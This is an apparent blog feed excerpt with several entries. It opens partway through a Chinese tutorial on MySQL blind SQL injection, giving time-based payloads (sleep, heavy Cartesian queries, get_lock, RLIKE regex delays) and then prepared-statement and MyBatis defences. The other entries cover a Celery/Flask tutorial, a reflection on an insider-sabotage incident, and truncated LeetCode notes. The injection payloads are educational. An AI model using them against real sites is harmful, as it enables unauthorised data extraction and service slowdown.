123456   |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 0 | 0;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 使用 ~</span><br><span class="line"></span><br><span class="line">使用情况：当系统不允许输入大的数字的时候，可能是限制了字符的长度，限制了不能使用科学计数法，但是我们还是想让其报错，我们就能采取这种方式</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~1 ;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~1                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551614 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select bin(~1);</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| bin(~1)                                                          |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| 1111111111111111111111111111111111111111111111111111111111111110 |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.32 sec)</span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>基于时间的盲注的一般思路是延迟注入，说白了就是将判断条件结合延迟函数注入进入，然后根据语句执行时间的长短来确定判断语句返回的 TRUE 还是 FALSE，从而去猜解一些未知的字段(整个猜解过程其实就是一种 fuzz)。</p><p>常用函数：</p><ul><li>1、MySQL的sleep和benchmark</li></ul><p><strong>sleep()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1=0,1, sleep(10)) --+  # 注释符用于闭合语句，使语句正常执行</span><br></pre></td></tr></table></figure><p>IF表达式：<br>IF(expr1,expr2,expr3) ：如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p><p><strong>benchmark(count,expr)</strong><br>BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select username from users where id=1) regexp &#x27;^a&#x27;;</span><br></pre></td></tr></table></figure><ul><li>2、Heavy Query 笛卡尔积</li></ul><p>将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure><ul><li><p>3.Get_lock() 加锁机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_lock(key,timeout) 一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)。</span><br><span class="line">如果key是第一次加锁返回1，反之等待时间进行第二次加锁。</span><br></pre></td></tr></table></figure><p>利用条件比较苛刻，需要使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_pconnect</span><br></pre></td></tr></table></figure><p>函数来连接数据库</p></li></ul><p>如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。</p><p>此盲注手法有一些限制，就是必须要同时开两个SESSION进行注入</p><ul><li>4、RLIKE注入</li></ul><p>正则DOS，和benchmark相似，利用SQL多次计算正则消耗计算资源产生延时效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;s&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;,1);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#x27;,1);</span><br><span class="line">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure><h2 id="SQL预编译"><a href="#SQL预编译" class="headerlink" title="SQL预编译"></a>SQL预编译</h2><h3 id="无法使用sql预编译的情况"><a href="#无法使用sql预编译的情况" class="headerlink" title="无法使用sql预编译的情况"></a>无法使用sql预编译的情况</h3><p>1、对于关键词order by来说，如果使用预编译处理，参数绑定为String类型，order by 的参数会被单引号包裹，导致无法排序 &#x2F;&#x2F; 还有like<br>2、对于拼接列名、表名的sql语句来说，参数绑定后也会用单引号包裹，故也无法使用预编译处理<br>3、在prepare绑定参数阶段也能够报错注入<br>4、某些数据库不支持预编译(如sqllite与低版本mysql)，可以使用<a href="https://xz.aliyun.com/t/7132#toc-0">模拟预编译</a></p><p><a href="https://xz.aliyun.com/t/7132#toc-0">Sql预编译于模拟预编译研究</a></p><h3 id="原理及方法"><a href="#原理及方法" class="headerlink" title="原理及方法"></a>原理及方法</h3><p>以mysql数据库为例：通常情况下，在数据库接收到一条普通的SQL语句后，<br>首先对其进行语义解析，随后对此条SQL语句进行优化并制定执行计划并执行；<br>当采用预编译操作时，首先将待执行的SQL语句中的参数值用占位符替代。当带着占位符的SQL语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。</p><p>经过预编译操作之后，无论后续向模板传入什么参数，这些参数仅仅被当成字符串进行查询处理，因此杜绝了sql注入的产生</p><p>使用预编译四步走：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1：定义预编译的sql语句，其中待填入的参数用 `?` 占位。注意，?无关类型，不需要加分号之类。其具体数据类型在下面setXX（）时决定。</span><br><span class="line"></span><br><span class="line">2：创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。</span><br><span class="line"></span><br><span class="line">3：填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。注意：问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）.</span><br><span class="line"></span><br><span class="line">4：执行预处理对象。主要有</span><br><span class="line">boolean execute() 在此 PreparedStatement 对象中执行 SQL 语句，该语句可以是任何种类的 SQL 语句</span><br><span class="line">ResultSet   executeQuery() 在此 PreparedStatement 对象中执行 SQL 查询，并返回该查询生成的 ResultSet 对象</span><br><span class="line">int    executeUpdate() 在此 PreparedStatement 对象中执行 SQL 语句，该语句必须是一个 SQL 数据操作语言（Data Manipulation Language，DML）语句，比如 INSERT、UPDATE 或 DELETE 语句；或者是无返回内容的 SQL 语句，比如 DDL 语句。</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String username = &quot;ye&quot;;</span><br><span class="line">String password = &quot;ye&quot;;</span><br><span class="line">String sql = &quot;select * from user where username = ? and password = ?;&quot;;</span><br><span class="line"></span><br><span class="line">db.stmt = db.conn.prepareStatement(sql);</span><br><span class="line">db.stmt.setString(1, username);</span><br><span class="line">db.stmt.setString(2, password);</span><br><span class="line">ResultSet rs = db.stmt.executeQuery();</span><br></pre></td></tr></table></figure><h3 id="mybatis预编译"><a href="#mybatis预编译" class="headerlink" title="mybatis预编译"></a>mybatis预编译</h3><p>mybatis 中使用 sqlMap 进行 sql 查询时，经常需要动态传递参数,使用<code>#&#123; &#125;</code>和 <code>$&#123; &#125;</code>来进行动态传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name = &quot;test&quot;;</span><br><span class="line">select * from user where name = #&#123;name&#125;;</span><br><span class="line">或</span><br><span class="line">select * from user where name = &#x27;$&#123;name&#125;&#x27;;</span><br></pre></td></tr></table></figure><p>但是在动态 SQL 解析阶段，<code>#&#123; &#125;</code>和 <code>$&#123; &#125;</code> 会有不同的表现：</p><p><strong>#{ }会解析为一个 JDBC 预编译语句（prepared statement）的参数标记符</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">select * from user where name = #&#123;name&#125;;</span><br><span class="line"># 解析为：</span><br><span class="line">select * from user where name = ?;</span><br></pre></td></tr></table></figure><p>一个 <code>#&#123; &#125;</code> 被解析为一个参数占位符 <code>?</code></p><p><strong>${ } 仅仅为一个纯碎的 string 替换，在动态 SQL 解析阶段将会进行变量替换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name = &#x27;$&#123;name&#125;&#x27;;</span><br><span class="line"># 当传递的参数为 &quot;test&quot; 时，上述 sql 的解析为</span><br><span class="line">select * from user where name = &quot;test&quot;;</span><br></pre></td></tr></table></figure><p>预编译之前的 SQL 语句已经不包含变量 name 了<br><code>$&#123; &#125;</code>的变量的替换阶段是在动态 SQL 解析阶段，而 <code>#&#123; &#125;</code> 的变量的替换是在 DBMS 中</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f">深入理解SQL注入与预编译</a><br><a href="https://www.anquanke.com/post/id/170626">K0rz3n师傅：一篇文章带你深入理解 SQL 盲注</a><br><a href="https://xz.aliyun.com/t/5505">SQL注入的有趣姿势</a><br><a href="https://xz.aliyun.com/t/8003">REGEXP注入与LIKE注入学习笔记</a><br><a href="https://segmentfault.com/a/1190000004617028">mybatis深入理解(一)之 # 与 $ 区别以及 sql 预编译</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#sql%E7%9B%B2%E6%B3%A8&quot;&gt;SQL盲注&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&quot;&gt;布尔盲注&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    
    <category term="learn" scheme="https://yinwc.github.io/tags/learn/"/>
    
  </entry>
  
  <entry>
    <title>基于Celery的后台任务</title>
    <link href="https://yinwc.github.io/2021/01/12/%E5%9F%BA%E4%BA%8ECelery%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BB%BB%E5%8A%A1/"/>
    <id>https://yinwc.github.io/2021/01/12/%E5%9F%BA%E4%BA%8ECelery%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BB%BB%E5%8A%A1/</id>
    <published>2021-01-12T09:35:12.000Z</published>
    <updated>2023-01-28T09:55:21.127Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#celery%E7%AE%80%E4%BB%8B">Celery简介</a><ul><li><a href="#%E5%88%9B%E5%BB%BAcelery-%E5%AE%9E%E4%BE%8B">创建Celery 实例</a></li></ul></li><li><a href="#flask%E4%B8%AD%E4%BD%BF%E7%94%A8celery">Flask中使用Celery</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="Celery简介"><a href="#Celery简介" class="headerlink" title="Celery简介"></a>Celery简介</h2><p>Celery 是一个异步任务队列&#x2F;基于分布式消息传递的作业队列，Celery 是一个强大的分布式任务队列，它可以让任务的执行完全脱离主程序，甚至可以被分配到其他主机上运行。通常使用它来实现异步任务（async task）和定时任务（crontab）</p><p>应用程序可能需要执行任何消耗资源的任务都可以交给任务队列，让应用程序自由和快速地响应客户端请求。</p><p>Celery是用Python编写的，但该协议可以在任何语言实现。它也可以与其他语言通过webhooks实现。</p><p><img src="/2021/01/12/%E5%9F%BA%E4%BA%8ECelery%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BB%BB%E5%8A%A1/1.png" alt="Python-Celery"></p><p>Celery主要包括以下四个模块：</p><ul><li><p>任务模块 <strong>Task</strong><br>包含异步任务和定时任务。其中，异步任务通常在业务逻辑中被触发并发往任务队列，而定时任务由 Celery Beat 进程周期性地将任务发往任务队列。</p></li><li><p>消息中间件<strong>Broker</strong></p><ul><li>Broker，即为任务调度队列，接收任务生产者发来的消息（即任务），将任务存入队列。Celery 本身不提供队列服务，官方推荐使用 RabbitMQ 和 Redis 等。</li><li>Broker部分负责任务消息的分发以及任务结果的存储这部分任务主要由中间数据存储系统完成，比如消息队列服务器RabbitMQ、redis、Amazon SQS、MongoDB、IronMQ等或者关系型数据库，使用关系型数据库依赖sqlalchemy或者django的ORM</li></ul></li><li><p>任务执行单元<strong>Worker</strong></p><ul><li>Worker 是执行任务的处理单元，它实时监控消息队列，获取队列中调度的任务，并执行它。在我的理解中工作线程就是写的python代码，当然还包括python调用系统工具功能</li></ul></li><li><p>任务结果存储<strong>Backend</strong></p><ul><li>Backend 用于存储任务的执行结果，以供查询。同消息中间件一样，存储也可使用 RabbitMQ, Redis 和 MongoDB 等。</li></ul></li></ul><p>使用 Celery 实现异步任务主要包含三个步骤：</p><ol><li>创建一个 Celery 实例</li><li>启动 Celery Worker</li><li>应用程序调用异步任务</li></ol><h3 id="创建Celery-实例"><a href="#创建Celery-实例" class="headerlink" title="创建Celery 实例"></a>创建Celery 实例</h3><p>创建test.py文件，写入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:V1ZkRA</span></span><br><span class="line"><span class="comment"># Time:2021/1/12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定消息中间件用 redis，URL 为 redis://127.0.0.1:6379；</span></span><br><span class="line">broker = <span class="string">&#x27;redis://127.0.0.1:6379&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定存储用 redis，URL 为 redis://127.0.0.1:6379/0；</span></span><br><span class="line"></span><br><span class="line">backend = <span class="string">&#x27;redis://127.0.0.1:6379/0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Celery 实例 app，名称为 my_task；</span></span><br><span class="line">app = Celery(<span class="string">&#x27;my_task&#x27;</span>, broker=broker, backend=backend)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建了一个 Celery 任务 add，当函数被 @app.task 装饰后，就成为可被 Celery 调度的任务；</span></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    time.sleep(<span class="number">5</span>)     <span class="comment"># 模拟耗时操作</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><p>启动Celery Worker<br>在当前目录，使用如下方式启动 Celery Worker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery worker -A tasks --loglevel=info</span><br></pre></td></tr></table></figure><p><img src="/2021/01/12/%E5%9F%BA%E4%BA%8ECelery%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BB%BB%E5%8A%A1/2.png" alt="Python-Celery"></p><h2 id="Flask中使用Celery"><a href="#Flask中使用Celery" class="headerlink" title="Flask中使用Celery"></a>Flask中使用Celery</h2><p><a href="https://github.com/miguelgrinberg/flask-celery-example">flask-celery-example</a></p><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(</span><br><span class="line">    CELERY_BROKER_URL=&#x27;redis://localhost:6379&#x27;,</span><br><span class="line">    CELERY_RESULT_BACKEND=&#x27;redis://localhost:6379&#x27;</span><br><span class="line">)</span><br><span class="line">celery = make_celery(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@celery.task()</span><br><span class="line">def add_together(a, b):</span><br><span class="line">    return a + b</span><br></pre></td></tr></table></figure><p>在后台进行调度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; result = add_together.delay(23, 42)</span><br><span class="line">&gt;&gt;&gt; result.wait()</span><br><span class="line">65</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/chenqiuge1984/article/details/80127446">异步任务神器 Celery 快速入门教程</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#celery%E7%AE%80%E4%BB%8B&quot;&gt;Celery简介&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%88%9B%E5%BB%BAcelery-%E5%AE%9E%E4%BE%8B&quot;&gt;创建Cel</summary>
      
    
    
    
    
    <category term="python" scheme="https://yinwc.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>安全事件以及后续整改的反思</title>
    <link href="https://yinwc.github.io/2020/12/18/2020%E5%B9%B4%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E4%BB%A5%E5%8F%8A%E5%90%8E%E7%BB%AD%E6%95%B4%E6%94%B9%E7%9A%84%E5%8F%8D%E6%80%9D/"/>
    <id>https://yinwc.github.io/2020/12/18/2020%E5%B9%B4%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E4%BB%A5%E5%8F%8A%E5%90%8E%E7%BB%AD%E6%95%B4%E6%94%B9%E7%9A%84%E5%8F%8D%E6%80%9D/</id>
    <published>2020-12-18T08:59:02.000Z</published>
    <updated>2023-01-28T09:26:50.959Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>by lei.tang</p></blockquote><h2 id="本次故障及事件简要回顾（来自公开渠道推文）"><a href="#本次故障及事件简要回顾（来自公开渠道推文）" class="headerlink" title="本次故障及事件简要回顾（来自公开渠道推文）"></a>本次故障及事件简要回顾（来自公开渠道推文）</h2><ul><li>2020年2月23日，18:56分，微盟研发中心运维部核心运维人员通过VPN登入服务器，并对线上生产环境进行了恶意破坏；</li><li>2月23日 19 时，微盟内部系统监控报警，出现大面积服务集群无法响应；</li><li>2月25日7 时，生产环境和数据部分恢复，预计25日晚24点完成生产环境修复，新用户恢复业务。老用户预计到2月28日晚上才能恢复。</li><li>微盟事后对恶意破坏生产环境的嫌疑人进行追踪分析，成功定位到嫌疑人登录账号及IP地址，并于24日向宝山公安局报案。目前犯罪嫌疑人已被宝山区公安局刑事拘留，犯罪承认了犯罪事实。</li></ul><h2 id="外界的观点描述"><a href="#外界的观点描述" class="headerlink" title="外界的观点描述"></a>外界的观点描述</h2><p>1、需要说明怎样的权限来约束运维？或者往外拓宽至每一个核心研发人员，如：测试，研发，DBA 这些角色中拥有高权限的人员。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-  例如：rm、mv、alias等危险命令应该受到严格的制约； </span><br></pre></td></tr></table></figure><ul><li>一个良好的运维输出能力应该是：人管代码，代码管机器，而非人管机器。</li><li>当约束过多，照成的流程审批过多，如何不增加额外的人力物力和财力</li></ul><p>2、备份该如何做？</p><ul><li>例如：备份事件的问题，全量备份和增量备份的校验，主从备份、异地备份等的制度</li><li>恢复的验证，要常演练，因为会遇到各种问题导致的恢复失败，比如：介质问题、数据问题、操作问题等</li></ul><h2 id="反思和总结"><a href="#反思和总结" class="headerlink" title="反思和总结"></a>反思和总结</h2><p>遇到问题，只有面对问题，解决问题，才是根本，而非甩锅。</p><p>在事出第一刻，通过排除，确定问题，也验证了安全工作的一些不足，对部分权限还未考虑到位。 后续的蛇鬼牛神全员出动，各种目的的人员，只能说感谢他们的关心。</p><p>安全圈，依靠着事件来驱动企业成长的太多，每次的事件，都是给行业带来一定的波动，也锤炼着领导，更锤炼着躺枪的负责人员，后续也就无非惩罚多少来以儆效尤了。</p><ul><li>简单罗列几点思考：<ul><li>1、工程师或者内部员工的职业道德，如加强安全意识以及法律法规教育；<ul><li>如何避免：内部员工账号密码泄露、内部代码泄露（如上传github、码云等三方平台）、或者邮件钓鱼攻击等各种情况 安全意识培训不能少，并且要定期执行，对研发，测试，运维，产品等，乃至于拓展到全员，以及新员工入职的培训。 更高的要求：对于管理者来说，或许员工的心里建设也是一个可指引的方向吧。毕竟人是企业的核心资产。</li></ul></li><li>2、服务器厂商的选择以及监控报警完善<ul><li>是自建IDC，还是混合云，还是全部上云，所带来的技术支持是截然不同的，涉及的服务恢复以及数据恢复。 监控报警体系的完善，对于敏感操作的监控以及报警及时性。当然根据本次事件，监控报警也就只能起到查原因的作用了，但依然不能否认他存在的价值。要不然为啥要ELK。</li></ul></li><li>3、梳理全网的站点，把控隔离情况<ul><li>及时梳理所有的网站，通过内部上报，运维外网开放host解析，IP探测，等多种方式，梳理内网外开放情况，</li><li>严格把控QA、DEV、PL、Oline 环境的相互隔离，以及非必要外网开放项目的回归内网</li></ul></li><li>4、权限以及角色的梳理<ul><li>对于运维、DBA、安全实现三权分立，运维管执行，DBA管数据，安全管审计，对于执行&#x2F;使用备份和存储备份的人员进行分开</li><li>对于角色这一块，进行最小权限执行的规定，以及同时启动角色系统平台开发，解决多平台的角色设置冗余</li><li>对于权限的申请，要执行多方审核，解决很多误操作，比如删数据，删文件等有意无意的操作</li></ul></li><li>5、全盘恢复后的安全复检<ul><li>近期三方提交了一些安全漏洞上来，发现很多漏洞都是之前没出现的功能，或者说之前已修复的，哪也就说明，恢复后的代码，出现了部分代码的回滚现象，或者说是业务迭代的时候，并没有同步安全部门。</li><li>哪如何去解决这样的问题呢？<ul><li>需要多个人互相校验平台，每个人都有各自的漏洞挖掘思路； 把安全加到更多环节中，如新业务上线、重点项目发版、核心项目每月安测等，把SDLC闭环； 专项的成立以及推进，可拉动多岗位人员参与，如敏感数据加密专项，账号体系专项等等</li></ul></li></ul></li><li>6、其他安全平台想法<ul><li>漏洞平台的总结，搭建漏洞管理平台，以及后续对接其他平台的二次开发 靶场平台的搭建，配合着安全培训，提高企业内部技术团队的演练效果</li></ul></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;by lei.tang&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;本次故障及事件简要回顾（来自公开渠道推文）&quot;&gt;&lt;a href=&quot;#本次故障及事件简要回顾（来自公开渠道推文）&quot; class=&quot;headerlink&quot; title=&quot;本次故障</summary>
      
    
    
    
    
    <category term="企业安全" scheme="https://yinwc.github.io/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode的一些记录</title>
    <link href="https://yinwc.github.io/2020/11/28/LeetCode%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/"/>
    <id>https://yinwc.github.io/2020/11/28/LeetCode%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</id>
    <published>2020-11-28T08:56:40.000Z</published>
    <updated>2023-02-02T07:03:59.414Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E4%B8%80%E7%BB%84%E6%95%B0%E6%95%B0%E7%BB%84%E7%9A%84%E5%8A%A8%E6%80%81%E5%92%8C">一组数数组的动态和</a></li><li><a href="#%E5%AF%BB%E6%89%BE%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E5%BF%83%E7%B4%A2%E5%BC%95">寻找数组的中心索引</a></li><li><a href="#%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C">两数之和</a></li><li><a href="#%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC">整数反转</a></li><li><a href="#%E5%9B%9E%E6%96%87%E6%95%B0">回文数</a></li><li><a href="#%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0">罗马数字转整数</a></li><li><a href="#%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80">最长公共前缀</a></li></ul><!-- /TOC --><h3 id="一组数数组的动态和"><a href="#一组数数组的动态和" class="headerlink" title="一组数数组的动态和"></a>一组数数组的动态和</h3><p>给你一个数组 nums 。数组「动态和」的计算公式为：runningSum[i] &#x3D; sum(nums[0]…nums[i]) 。<br>请返回 nums 的动态和。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 